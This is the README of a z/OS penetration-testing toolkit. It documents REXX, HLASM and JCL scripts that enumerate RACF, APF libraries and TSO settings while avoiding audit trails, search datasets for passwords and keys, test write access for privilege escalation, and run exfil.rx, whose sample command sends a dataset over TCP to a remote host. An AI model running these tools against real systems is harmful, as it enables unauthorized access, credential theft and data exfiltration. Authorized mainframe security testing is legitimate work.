# z/OS Enumeration & Pentesting Toolkit

> For Unix System Services (USS/OMVS) tools see [Unix/README.md](Unix/README.md)

A collection of z/OS penetration testing and enumeration scripts covering TSO/ISPF, RACF, APF libraries, dataset access, and data exfiltration. Tools are written in REXX, HLASM, and JCL and are designed to run directly on a z/OS system.

---

## Enumeration

### ENUM

The main z/OS system enumeration script. Gathers security manager configuration, APF datasets, SVCs, running users, TSO authority tables, and more — primarily through in-memory storage reads to minimize audit trail.

```
./ENUM <argument>
```

| Argument | Description |
|----------|-------------|
| `ALL`    | Display all information |
| `APF`    | APF authorized datasets |
| `CAT`    | Master catalog |
| `JOB`    | Executing job name |
| `PATH`   | Dataset concatenation (SYSPROC/SYSEXEC) |
| `SEC`    | Security manager info (RACF/ACF2/TopSecret) |
| `SVC`    | Installed SVCs |
| `TSTA`   | TESTAUTH authorization status |
| `TSOT`   | TSO AUTHCMD/AUTHPGM tables |
| `USSU`   | USS/OMVS user list |
| `VERS`   | OS version information |
| `WHO`    | Currently logged on TSO/OMVS users |
| `HELP`   | Show help |

**Note on output:** ENUM uses EBCDIC-safe placeholders for brackets and braces (`<<LB>>`, `<<RB>>`, `<<LC>>`, `<<RC>>`). After downloading output, convert them with:

```sh
sed 's/<<LB>>/[/g; s/<<RB>>]/]/g; s/<<LC>>/{/g; s/<<RC>>}/}/g' output.txt
```

### SEARCHRX.rx

Runs a set of common RACF `SEARCH` commands to quickly identify high-value targets:

- Datasets in WARNING mode (access not logged)
- All datasets with READ or greater access
- UNIX privilege (`UNIXPRIV`) resources
- `BPX.**` facility class resources
- Surrogate submit access (`SURROGAT` class)

```
EX 'HLQ.DATASET(SEARCHRX)'
```

No arguments needed — results are printed directly to the terminal.

### SYS0WN.rx

Lists all datasets allocated to `SYSPROC` and `SYSEXEC` (the TSO equivalent of `$PATH`) with their creation date, last reference date, and your access level. Useful for identifying writable entries that could allow privilege escalation via REXX exec injection.

```
EX 'HLQ.SYS0WN'
```

### STARTMAP.rx (startmap.rx)

Maps the z/OS IPL configuration — identifies the IPL dataset and member, SYSPARM, IEASYM symbols, and all PARMLIB concatenation entries. Useful for understanding the system startup environment and finding additional targets.

```
EX 'HLQ.STARTMAP'
```

### DSNSRCH.rx (dsnsrch.rx)

Searches a list of datasets (and all their members, for PDSes) for a keyword string. Feed it the output of a catalog search tool like CATMAP3 — extract the names of datasets you have READ access to, put them in a dataset, then call DSNSRCH to search for passwords, keys, connection strings, etc.

```
EX 'HLQ.DSNSRCH' 'YOUR.DSN(LIST) search_string'
```

Where `YOUR.DSN(LIST)` is a dataset/member containing one dataset name per line.

---

## Access Testing

### ACCESS

An HLASM program that checks your RACF access level to a single dataset. Run from TSO — it prompts for a dataset name and volume serial, then calls `RACROUTE REQUEST=AUTH` and prints your access level (NONE / READ / UPDATE / CONTROL / ALTER / NOT PROTECTED).

To assemble:

```jcl
//ACCESS JOB (1),'ACCESS',CLASS=A,MSGCLASS=Y,
//         NOTIFY=&SYSUID,MSGLEVEL=(1,1)
//ASM      EXEC PROC=HLASMCL,PARM.L=(TEST),PARM.C=(TEST)
//SYSIN    DD   DSN=SOME.SOURCE.PDS(ACCESS),DISP=(SHR)
//L.SYSLMOD DD DSN=SOME.LINKLIB(ACCESS),DISP=(SHR)
//L.SYSPRINT  DD SYSOUT=*
```

To run from TSO:

```
CALL 'SOME.LINKLIB(ACCESS)' 'SOME.DATASET'
```

### APFCHECK

A self-contained JCL job that assembles, links, and immediately runs an HLASM program to enumerate every APF authorized library on the system and check your access level to each one. Writable APF libraries are a direct path to privilege escalation.

Edit the job before submitting:

- Change `FOO.LOAD.LIB` to a load library you can write to
- Submit the job and review output in SDSF or TSO `OUTPUT`

The output table shows: `ACCESS | VOLUME | DATASET`

### PDSTEST.rexx

Tests write access to a list of datasets by attempting to allocate each one in SHR mode and write a record. Prompts before each attempt. Useful for confirming actual write access beyond what RACF reports.

```
EX 'HLQ.PDSTEST' 'YOUR.DSN(LIST) testtext'
```

Where `YOUR.DSN(LIST)` contains one dataset name per line and `testtext` is the content to write. Successfully written datasets are flagged with `***`.

### PDSACCESSTEST.rexx

Similar to PDSTEST but tests write access by attempting to create a named member within each PDS in the list. Confirms write access at the member level rather than dataset level, which can differ for PDSEs with member-level security.

```
EX 'HLQ.PDSACCESSTEST' 'YOUR.DSN(LIST) MEMBNAME'
```

---

## Post-Exploitation

### exfil.rx

Exfiltrates the contents of a dataset over TCP to a remote host, trying each port in a list until one connects. Pairs with [portscan.java](Unix/README.md#portscan.java) (to find open egress ports) and tools like egressbuster on the receiving end.

```
EX 'HLQ.REXXLIB(EXFIL)' 'DATASET.TO(EXFIL) 192.168.1.100 80 443 8080'
```

Arguments: `dataset host port1 [port2 ...]`

Each line of the dataset is sent over the socket, newline-terminated. The script tries each port in order and stops on the first successful connection.
